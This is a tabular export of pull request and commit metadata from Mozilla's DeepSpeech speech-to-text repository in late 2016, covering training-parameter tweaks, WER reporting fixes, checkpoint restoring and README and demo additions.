4125,https://api.github.com/repos/mozilla/DeepSpeech/pulls/310,310,Fixed #309,,kdavis-mozilla,12054740,2016-12-22T05:21:02Z,CONTRIBUTOR,True,0,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,965806184085cb78f033b7769072fc8928b8eb2f,Fixed #309
4126,https://api.github.com/repos/mozilla/DeepSpeech/pulls/305,305,Fix #304; Environment variable for device placement logs,,tilmankamp,5991088,2016-12-21T11:40:00Z,CONTRIBUTOR,True,3,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c10908a581e996c2f3cb64229d0e3167c379d76,Fix #304; Environment variable for device placement logs
4127,https://api.github.com/repos/mozilla/DeepSpeech/pulls/301,301,Fix #284; BiRNN with stride 2,"Experimental PR - on ldc93s1 it reduced time by factor 2 AND converged faster (approximately 1.5 times - why?).
We now have to see how this performs on real/big data.",tilmankamp,5991088,2016-12-19T15:25:29Z,CONTRIBUTOR,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e99eeffddcb2ca00bc77f7a0f6cd9fa5873bbde,Fix #284; BiRNN with stride 2
4128,https://api.github.com/repos/mozilla/DeepSpeech/pulls/299,299,Fix #298; Added global time measurement,,tilmankamp,5991088,2016-12-19T11:07:00Z,CONTRIBUTOR,True,11,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c32932fb5ea0133adae247675a0934334ae71c5a,Fix #298; Added global time measurement
4129,https://api.github.com/repos/mozilla/DeepSpeech/pulls/283,283,Issue282,,kdavis-mozilla,12054740,2016-12-09T22:41:49Z,CONTRIBUTOR,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b60a55635e4a8299ae78d4e7e40254dba9c5c199,Fixed #282
4130,https://api.github.com/repos/mozilla/DeepSpeech/pulls/283,283,Issue282,,kdavis-mozilla,12054740,2016-12-09T22:41:49Z,CONTRIBUTOR,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0115d8da7d75f2af535fba099efe0e2e6e558779,Defautl to 10
4131,https://api.github.com/repos/mozilla/DeepSpeech/pulls/280,280,Fix #225; Added descriptions and links to WER charts,,tilmankamp,5991088,2016-12-08T00:28:56Z,CONTRIBUTOR,True,9,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9213a7c1836f94c83f5068fbb98c90cb35702641,Fix #225; Added descriptions and links to WER charts
4132,https://api.github.com/repos/mozilla/DeepSpeech/pulls/279,279,Validation and training WER labels are mis-reported,Fixes #278,lissyx,1645737,2016-12-05T07:52:49Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae7d559c8e99f55921bd2d366c8680313c562de2,"Validation and training WER labels are mis-reported

Fixes #278"
4133,https://api.github.com/repos/mozilla/DeepSpeech/pulls/277,277,Set ds_epochs to 500,,kdavis-mozilla,12054740,2016-12-04T17:51:13Z,CONTRIBUTOR,True,1238,1,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,698eb4bcf4e509a863b2ccff5ebfcae2db68d3f1,"Make Tensorflow Serving APIs available out of tree

Fixes #267"
4134,https://api.github.com/repos/mozilla/DeepSpeech/pulls/277,277,Set ds_epochs to 500,,kdavis-mozilla,12054740,2016-12-04T17:51:13Z,CONTRIBUTOR,True,1238,1,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d092b612cf54fa59dd56e9de568258eae87a0f4,"Merge pull request #273 from lissyx/issue267

Make Tensorflow Serving APIs available out of tree"
4135,https://api.github.com/repos/mozilla/DeepSpeech/pulls/277,277,Set ds_epochs to 500,,kdavis-mozilla,12054740,2016-12-04T17:51:13Z,CONTRIBUTOR,True,1238,1,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa283cff0df1ad558de3782af0e3b6835220b673,Fixed #275
4136,https://api.github.com/repos/mozilla/DeepSpeech/pulls/277,277,Set ds_epochs to 500,,kdavis-mozilla,12054740,2016-12-04T17:51:13Z,CONTRIBUTOR,True,1238,1,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb7ede01b20ba50440373a6d940ada6f542dc74b,"Merge pull request #276 from mozilla/issue275

Fixed #275"
4137,https://api.github.com/repos/mozilla/DeepSpeech/pulls/276,276,Fixed #275,,kdavis-mozilla,12054740,2016-12-04T17:26:39Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa283cff0df1ad558de3782af0e3b6835220b673,Fixed #275
4138,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d931328e356c87919bca9b6dcb2a982a9ef75c20,Run with ldc93s1 importer by default
4139,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28eacafdd3a4148fa35b26f0101de5df4bac0960,Correct command line quote in README file
4140,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fce2cacf1905517aa37e8bd4de96fa5348d73888,Tweak scripts to more appropriate default values
4141,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffc76343dceb16ed8bd7bb831615e08e85c1c0a3,Add a README for the binaries directory
4142,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85cd407a18d50df10b10915d5a241fc9e93345b3,Rename 'training_iters' -> 'epochs'
4143,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e03c21235f7c743676126fcfb814d4110b3d30ce,Add a demos directory with two speech recognition demos
4144,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d3aff6131b6c7cb0372fa83e60473cb60a018aa,Updated in line with comments
4145,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1af8cd2307b39f86c125b9d8454a453a71114762,"Merge pull request #265 from Cwiiis/user-friendly

Make the repository slightly more user-friendly"
4146,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa8391787febc0c1836104cdc6635340273e3fa9,"Merge pull request #249 from Cwiiis/dictation-demo

Add a demos directory with two speech recognition demos"
4147,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa96ce455a0c8465ad4ccdfeba29730f74e37464,Fix comment in BiRNN
4148,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66df1b0d9f45657cbc4d641d30e0ce3446c15490,"Merge pull request #266 from mozilla/reuben-patch-1

Fix comment in BiRNN"
4149,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ff5b30ff31b38decb2ae044323fa0ceb6ab8280,Fix #263; Fixed random seed to ensure reproducibility of results
4150,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7ad94cd1c576f27b29175693a8145706ac43639,"Merge pull request #268 from mozilla/issue263

Fix #263; Fixed random seed to ensure reproducibility of results"
4151,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a65beddb28da03392e8ab5cc64b30af8d1e9c192,Updated learning_rate to fix inf's
4152,https://api.github.com/repos/mozilla/DeepSpeech/pulls/274,274,Update with decreased learning rate and fixed random seed,,kdavis-mozilla,12054740,2016-12-01T14:43:47Z,CONTRIBUTOR,True,593,76,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2607119b18e7104eb684ab027800525a9570143e,"Merge pull request #272 from mozilla/issue238

Updated learning_rate to fix inf's"
4153,https://api.github.com/repos/mozilla/DeepSpeech/pulls/273,273,Make Tensorflow Serving APIs available out of tree,Fixes #267,lissyx,1645737,2016-12-01T14:35:45Z,COLLABORATOR,True,1237,0,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,698eb4bcf4e509a863b2ccff5ebfcae2db68d3f1,"Make Tensorflow Serving APIs available out of tree

Fixes #267"
4154,https://api.github.com/repos/mozilla/DeepSpeech/pulls/272,272,Updated learning_rate to fix inf's,,kdavis-mozilla,12054740,2016-12-01T14:06:40Z,CONTRIBUTOR,True,4,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a65beddb28da03392e8ab5cc64b30af8d1e9c192,Updated learning_rate to fix inf's
4155,https://api.github.com/repos/mozilla/DeepSpeech/pulls/271,271,Update README.me to mention run-ldc93s1.sh and be more explicit about GPU requirements,I also fixed the part that said we depend on IronPython (what! :P) and made the dependency on Paramiko for the website stuff be optional.,reuben,477142,2016-12-01T12:55:13Z,MEMBER,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17eb42cc58100b3d3030b35da22f4e5bf820a175,Update README to mention run-ldc93s1.sh and be more explicit about GPU requirements
4156,https://api.github.com/repos/mozilla/DeepSpeech/pulls/271,271,Update README.me to mention run-ldc93s1.sh and be more explicit about GPU requirements,I also fixed the part that said we depend on IronPython (what! :P) and made the dependency on Paramiko for the website stuff be optional.,reuben,477142,2016-12-01T12:55:13Z,MEMBER,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4097be941ab31ba80c95406dd946fce486863ad5,Focus on the notebook instead of the bin/ scripts on the README.
4157,https://api.github.com/repos/mozilla/DeepSpeech/pulls/270,270,Fix #269; Set ds_relu_clip to 2.0,,tilmankamp,5991088,2016-12-01T11:07:38Z,CONTRIBUTOR,False,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,deb09f5d823a491d3384cab731ecce504bedd38e,Fix #269; Set ds_relu_clip to 2.0
4158,https://api.github.com/repos/mozilla/DeepSpeech/pulls/268,268,Fix #263; Fixed random seed to ensure reproducibility of results,,tilmankamp,5991088,2016-12-01T10:34:26Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ff5b30ff31b38decb2ae044323fa0ceb6ab8280,Fix #263; Fixed random seed to ensure reproducibility of results
4159,https://api.github.com/repos/mozilla/DeepSpeech/pulls/266,266,Fix comment in BiRNN,,reuben,477142,2016-11-30T22:37:32Z,MEMBER,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa96ce455a0c8465ad4ccdfeba29730f74e37464,Fix comment in BiRNN
4160,https://api.github.com/repos/mozilla/DeepSpeech/pulls/265,265,Make the repository slightly more user-friendly,This makes a few changes that make the repository checkout a bit more usable/understandable by default.,Cwiiis,668518,2016-11-30T18:08:07Z,CONTRIBUTOR,True,41,72,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d931328e356c87919bca9b6dcb2a982a9ef75c20,Run with ldc93s1 importer by default
4161,https://api.github.com/repos/mozilla/DeepSpeech/pulls/265,265,Make the repository slightly more user-friendly,This makes a few changes that make the repository checkout a bit more usable/understandable by default.,Cwiiis,668518,2016-11-30T18:08:07Z,CONTRIBUTOR,True,41,72,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28eacafdd3a4148fa35b26f0101de5df4bac0960,Correct command line quote in README file
4162,https://api.github.com/repos/mozilla/DeepSpeech/pulls/265,265,Make the repository slightly more user-friendly,This makes a few changes that make the repository checkout a bit more usable/understandable by default.,Cwiiis,668518,2016-11-30T18:08:07Z,CONTRIBUTOR,True,41,72,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fce2cacf1905517aa37e8bd4de96fa5348d73888,Tweak scripts to more appropriate default values
4163,https://api.github.com/repos/mozilla/DeepSpeech/pulls/265,265,Make the repository slightly more user-friendly,This makes a few changes that make the repository checkout a bit more usable/understandable by default.,Cwiiis,668518,2016-11-30T18:08:07Z,CONTRIBUTOR,True,41,72,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffc76343dceb16ed8bd7bb831615e08e85c1c0a3,Add a README for the binaries directory
4164,https://api.github.com/repos/mozilla/DeepSpeech/pulls/265,265,Make the repository slightly more user-friendly,This makes a few changes that make the repository checkout a bit more usable/understandable by default.,Cwiiis,668518,2016-11-30T18:08:07Z,CONTRIBUTOR,True,41,72,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85cd407a18d50df10b10915d5a241fc9e93345b3,Rename 'training_iters' -> 'epochs'
4165,https://api.github.com/repos/mozilla/DeepSpeech/pulls/265,265,Make the repository slightly more user-friendly,This makes a few changes that make the repository checkout a bit more usable/understandable by default.,Cwiiis,668518,2016-11-30T18:08:07Z,CONTRIBUTOR,True,41,72,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d3aff6131b6c7cb0372fa83e60473cb60a018aa,Updated in line with comments
4166,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e2c1025c27ff9d25b363a17c194d8fcd617f80d9,Fixed #231
4167,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,313a71e9dad30e900c1dbee1f195b6da78d7503c,Fixed #226; Environment variables for batch-set limits
4168,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b76eeb5b789289cc8c89e4adfbada89b1183f32c,"Merge pull request #248 from mozilla/issue231

Fixed #231"
4169,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2e26e19dc3bde79abd720bbc67802312a24eac7a,Changes addressing PR comments
4170,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,efb3a6d8c2e179020f30d79b34c1ce8e49a56590,"Merge pull request #251 from mozilla/issue226

Fixed #226; Environment variables for batch-set limits"
4171,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ec9cc91d57194ae3bd153a73b27f6a629ef9157,"Restore checkpoint automatically based on some rules

Fixes #250"
4172,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,36f488303411ac33ed74ad4ba8cd397eb5df19f1,"Merge pull request #256 from lissyx/issue250

Restore checkpoint automatically based on some rules"
4173,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad735d63ae8ec81134a0dd049abd39c1682568c7,Fix issue #259
4174,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b275c70c201480b8ab3d446f9ec52941908779a6,"Merge pull request #260 from mozilla/issue259

Fix issue #259"
4175,https://api.github.com/repos/mozilla/DeepSpeech/pulls/261,261,Wer update,,lissyx,1645737,2016-11-30T09:24:47Z,COLLABORATOR,True,122,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ceb7f9fda2e65457099eca472c8c5bebfb91be0,Merge remote-tracking branch 'upstream/master' into wer-update
4176,https://api.github.com/repos/mozilla/DeepSpeech/pulls/260,260,Fix issue #259,,kdavis-mozilla,12054740,2016-11-30T05:45:47Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad735d63ae8ec81134a0dd049abd39c1682568c7,Fix issue #259
4177,https://api.github.com/repos/mozilla/DeepSpeech/pulls/256,256,Restore checkpoint automatically based on some rules,Fixes #250,lissyx,1645737,2016-11-29T10:02:30Z,COLLABORATOR,True,71,21,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ec9cc91d57194ae3bd153a73b27f6a629ef9157,"Restore checkpoint automatically based on some rules

Fixes #250"
4178,https://api.github.com/repos/mozilla/DeepSpeech/pulls/254,254,Fix #253; Set state_is_tuple=True on BasicLSTMCell,Experimental PR - to be checked on a big machine. Be warned: Most probably this changes the graph. ,tilmankamp,5991088,2016-11-28T15:37:48Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ffc638171e7215773f17c9585013f9d3f5d3fc6,Fix #253; Set state_is_tuple=True on BasicLSTMCell
4179,https://api.github.com/repos/mozilla/DeepSpeech/pulls/251,251,Fixed #226; Environment variables for batch-set limits,@kdavis-mozilla Please take a look.,tilmankamp,5991088,2016-11-28T15:02:37Z,CONTRIBUTOR,True,48,18,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,313a71e9dad30e900c1dbee1f195b6da78d7503c,Fixed #226; Environment variables for batch-set limits
4180,https://api.github.com/repos/mozilla/DeepSpeech/pulls/251,251,Fixed #226; Environment variables for batch-set limits,@kdavis-mozilla Please take a look.,tilmankamp,5991088,2016-11-28T15:02:37Z,CONTRIBUTOR,True,48,18,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2e26e19dc3bde79abd720bbc67802312a24eac7a,Changes addressing PR comments
4181,https://api.github.com/repos/mozilla/DeepSpeech/pulls/249,249,Add a demos directory with two speech recognition demos,,Cwiiis,668518,2016-11-28T13:56:49Z,CONTRIBUTOR,True,541,1,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e03c21235f7c743676126fcfb814d4110b3d30ce,Add a demos directory with two speech recognition demos
4182,https://api.github.com/repos/mozilla/DeepSpeech/pulls/248,248,Fixed #231,@kdavis-mozilla Just removed the assignments. Please take a look.,tilmankamp,5991088,2016-11-28T13:35:05Z,CONTRIBUTOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e2c1025c27ff9d25b363a17c194d8fcd617f80d9,Fixed #231
4183,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29ec75a58cd0f6e2953b1d1584bfe2febae8976f,Fixed #236
4184,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,994fc962ceaf2b4783784aeb32641aeb510fcc73,Fixed #241
4185,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06bb017c15a09f821fb9d3622d6badfb2e8b0b26,Fixed #239
4186,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d2df32cd5ff48f9d05e3a651f826ea3fbecbd99,"Merge pull request #242 from mozilla/issue241

Fixed #241"
4187,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,077c4cda33bd71078db8ea11973da5ac1cfb1f0f,Fixed #244
4188,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,605b036b67a66ebfa66bb8d752b74b8a6fc261de,Address review comments
4189,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afc7135a855e6dc29830198635cb9f746b7226ef,"Merge pull request #240 from mozilla/issue236

Fixed #236"
4190,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c75e7ecd1ae81a830ff0bfacb3d39ad252e840c5,"Merge pull request #243 from mozilla/issue239

Fixed #239"
4191,https://api.github.com/repos/mozilla/DeepSpeech/pulls/247,247,Kicking off next run,,kdavis-mozilla,12054740,2016-11-28T11:12:38Z,CONTRIBUTOR,True,100,31,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19ade3ef44f2a3ee4c60eb7f726117ec8ce08253,"Merge pull request #245 from mozilla/issue244

Fixed #244"
4192,https://api.github.com/repos/mozilla/DeepSpeech/pulls/245,245,Fixed #244,,kdavis-mozilla,12054740,2016-11-28T09:56:43Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,077c4cda33bd71078db8ea11973da5ac1cfb1f0f,Fixed #244
4193,https://api.github.com/repos/mozilla/DeepSpeech/pulls/243,243,Fixed #239,,kdavis-mozilla,12054740,2016-11-28T08:46:09Z,CONTRIBUTOR,True,65,23,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06bb017c15a09f821fb9d3622d6badfb2e8b0b26,Fixed #239
